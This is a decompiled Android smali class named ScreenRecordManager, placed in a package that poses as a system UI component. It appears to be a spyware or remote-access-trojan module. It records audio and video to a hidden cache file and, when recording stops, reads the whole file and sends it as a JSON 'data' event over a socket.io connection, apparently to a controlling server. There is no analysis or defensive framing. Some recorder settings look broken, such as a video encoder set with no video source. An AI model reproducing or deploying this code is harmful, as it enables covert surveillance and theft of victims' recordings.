.class public Lcom/system/android/ui/ScreenRecordManager;
.super Ljava/lang/Object;
.source "ScreenRecordManager.java"


# static fields
.field static final TAG:Ljava/lang/String; = "ScreenRecord"

.field static recordingFile:Ljava/io/File;

.field static recorder:Landroid/media/MediaRecorder;

.field static isRecording:Z

.field static context:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 18
    const/4 v0, 0x0

    sput-boolean v0, Lcom/system/android/ui/ScreenRecordManager;->isRecording:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static sendRecording(Ljava/io/File;)V
    .locals 8
    .param p0, "file"    # Ljava/io/File;

    .line 95
    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v1, v0

    .line 97
    .local v1, "size":I
    new-array v0, v1, [B

    .line 99
    .local v0, "data":[B
    :try_start_0
    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 100
    .local v2, "buf":Ljava/io/BufferedInputStream;
    array-length v3, v0

    const/4 v4, 0x0

    invoke-virtual {v2, v0, v4, v3}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 101
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 102
    .local v3, "object":Lorg/json/JSONObject;
    const-string v5, "type"

    const-string v6, "0xSR"

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 103
    const-string v5, "file"

    invoke-virtual {p0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v5, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 104
    const-string v5, "buffer"

    invoke-virtual {v3, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 105
    const-string v5, "timestamp"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    invoke-virtual {v3, v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 106
    invoke-static {}, Lcom/system/android/ui/IOSocket;->getInstance()Lcom/system/android/ui/IOSocket;

    move-result-object v5

    invoke-virtual {v5}, Lcom/system/android/ui/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v5

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    const/4 v7, 0x0

    aput-object v3, v6, v7

    const-string v7, "data"

    invoke-virtual {v5, v7, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 107
    invoke-virtual {v2}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .end local v2    # "buf":Ljava/io/BufferedInputStream;
    .end local v3    # "object":Lorg/json/JSONObject;
    goto :goto_0

    .line 112
    :catch_0
    move-exception v2

    .line 113
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_1

    .line 110
    .end local v2    # "e":Lorg/json/JSONException;
    :catch_1
    move-exception v2

    .line 111
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    .end local v2    # "e":Ljava/io/IOException;
    goto :goto_0

    .line 108
    :catch_2
    move-exception v2

    .line 109
    .local v2, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v2}, Ljava/io/FileNotFoundException;->printStackTrace()V

    .line 114
    .end local v2    # "e":Ljava/io/FileNotFoundException;
    :goto_0
    nop

    .line 116
    :goto_1
    return-void
.end method


# virtual methods
.method public static startRecording(Landroid/content/Context;)V
    .locals 6
    .param p0, "ctx"    # Landroid/content/Context;

    .line 28
    sput-object p0, Lcom/system/android/ui/ScreenRecordManager;->context:Landroid/content/Context;

    .line 30
    sget-boolean v0, Lcom/system/android/ui/ScreenRecordManager;->isRecording:Z

    if-nez v0, :cond_0

    .line 32
    :try_start_0
    const-string v0, "screen_record"

    const-string v1, ".mp4"

    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v2

    invoke-static {v0, v1, v2}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v0

    sput-object v0, Lcom/system/android/ui/ScreenRecordManager;->recordingFile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 38
    :try_start_1
    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    .line 39
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 40
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 41
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setVideoEncoder(I)V

    .line 42
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 43
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    sget-object v1, Lcom/system/android/ui/ScreenRecordManager;->recordingFile:Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 44
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    const/16 v1, 0xbb8

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setVideoEncodingBitRate(I)V

    .line 45
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    const/16 v1, 0x1f40

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setVideoFrameRate(I)V

    .line 46
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    .line 47
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    .line 49
    const/4 v0, 0x1

    sput-boolean v0, Lcom/system/android/ui/ScreenRecordManager;->isRecording:Z

    .line 50
    const-string v0, "ScreenRecord"

    const-string v1, "Recording started"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    .line 35
    :catch_0
    move-exception v0

    .line 36
    .local v0, "e":Ljava/io/IOException;
    const-string v1, "ScreenRecord"

    const-string v2, "Error creating temp file"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 52
    .end local v0    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v0

    .line 53
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "ScreenRecord"

    const-string v2, "Recording error"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 55
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void

    :cond_0
    const-string v0, "ScreenRecord"

    const-string v1, "Already recording"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1
    return-void
.end method

.method public static stopRecording(Landroid/content/Context;)V
    .locals 3
    .param p0, "ctx"    # Landroid/content/Context;

    .line 60
    sget-boolean v0, Lcom/system/android/ui/ScreenRecordManager;->isRecording:Z

    if-eqz v0, :cond_0

    .line 62
    :try_start_0
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_1

    .line 63
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    .line 64
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 65
    const/4 v0, 0x0

    sput-object v0, Lcom/system/android/ui/ScreenRecordManager;->recorder:Landroid/media/MediaRecorder;

    .line 67
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recordingFile:Ljava/io/File;

    if-eqz v0, :cond_2

    .line 68
    sget-object v0, Lcom/system/android/ui/ScreenRecordManager;->recordingFile:Ljava/io/File;

    invoke-static {v0}, Lcom/system/android/ui/ScreenRecordManager;->sendRecording(Ljava/io/File;)V

    .line 70
    :cond_2
    const/4 v0, 0x0

    sput-boolean v0, Lcom/system/android/ui/ScreenRecordManager;->isRecording:Z

    .line 71
    const-string v0, "ScreenRecord"

    const-string v1, "Recording stopped"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 75
    :catch_0
    move-exception v0

    .line 76
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "ScreenRecord"

    const-string v2, "Error stopping recording"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 78
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void

    .line 73
    :cond_1
    const-string v0, "ScreenRecord"

    const-string v1, "No recorder to stop"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    :cond_0
    const-string v0, "ScreenRecord"

    const-string v1, "Not recording"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1
    return-void
.end method

.method public static startStreaming(Landroid/content/Context;)V
    .locals 5
    .param p0, "ctx"    # Landroid/content/Context;

    .line 82
    sput-object p0, Lcom/system/android/ui/ScreenRecordManager;->context:Landroid/content/Context;

    .line 84
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/android/ui/ScreenCaptureService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 85
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 86
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 87
    const-string v0, "ScreenRecord"

    const-string v1, "Streaming started"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 88
    return-void
.end method
